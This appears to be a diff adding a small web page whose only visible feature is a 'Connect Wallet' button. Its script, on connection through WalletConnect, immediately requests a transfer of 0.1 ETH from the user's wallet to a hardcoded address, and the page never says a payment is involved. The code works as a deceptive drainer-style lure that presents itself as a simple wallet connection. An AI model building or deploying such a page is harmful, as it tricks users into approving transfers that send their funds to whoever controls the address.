@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Wallet</title>
+    <style>
+        .button {
+            background-color: #4CAF50; /* Green */
+            border: none; 
+            color: white;
+            padding: 15px 32px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+            border-radius: 12px;
+        }
+
+        .button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+
+<button class="button" onclick="connectWallet()">Connect Wallet</button>
+
+<script src="https://cdn.jsdelivr.net/npm/@walletconnect/client@1.6.6/dist/umd/index.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@walletconnect/qrcode-modal@1.5.2/dist/umd/index.min.js"></script>
+<script>
+    async function connectWallet() {
+        const WalletConnect = window.WalletConnect.default;
+        const QRCodeModal = window.WalletConnectQRCodeModal.default;
+
+        // Create a connector
+        const connector = new WalletConnect({
+            bridge: "https://bridge.walletconnect.org", // Required
+            qrcodeModal: QRCodeModal,
+        });
+
+        // Check if connection is already established
+        if (!connector.connected) {
+            // create new session
+            await connector.createSession();
+        }
+
+        // Subscribe to connection events
+        connector.on("connect", async (error, payload) => {
+            if (error) {
+                throw error;
+            }
+
+            // Get provided accounts and chainId
+            const { accounts } = payload.params[0];
+            const sender = accounts[0];
+            const recipient = '0x473E7FC67218FaAEF165Ba248CE4EC8555399a70'; // Your address here
+            const amount = '100000000000000000'; // 0.1 ETH in wei
+
+            const transactionParameters = {
+                to: recipient,
+                from: sender,
+                value: amount,
+            };
+
+            // Send transaction
+            try {
+                const txHash = await connector.sendTransaction(transactionParameters);
+                alert('Transaction sent! Tx Hash: ' + txHash);
+            } catch (error) {
+                console.error(error);
+                alert('Transaction failed!');
+            }
+        });
+
+        connector.on("disconnect", (error, payload) => {
+            if (error) {
+                throw error;
+            }
+
+            alert('Wallet disconnected');
+        });
+    }
+</script>
+
+</body>
+</html>
